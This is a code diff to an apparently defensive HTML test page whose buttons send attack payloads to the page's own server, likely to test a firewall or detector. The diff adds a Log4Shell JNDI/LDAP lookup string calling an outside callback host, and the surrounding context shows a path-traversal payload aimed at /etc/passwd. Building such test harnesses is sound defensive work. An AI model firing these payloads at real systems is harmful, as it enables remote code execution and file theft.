@@ -21,6 +21,7 @@
         <button id="sqli-body">Send SQLI body</button>
         <button id="lfi-url">Send LFI url</button>
         <button id="lfi-body">Send LFI body</button>
+        <button id="log4j">Send LOG4J</button>
     </body>
 
     <script>
@@ -62,6 +63,12 @@
             xhr.open('POST', '/', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(JSON.stringify({lfi: "../../../../../../../../etc/passwd"}));
+        });
+
+        document.getElementById('log4j').addEventListener('click', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', '/${jndi:ldap://${hostName}.c6qgldh5g22l07bu1lvgcg4ukyyygg3tw.example.com/a}', true);
+            xhr.send();
         });
     </script>
 
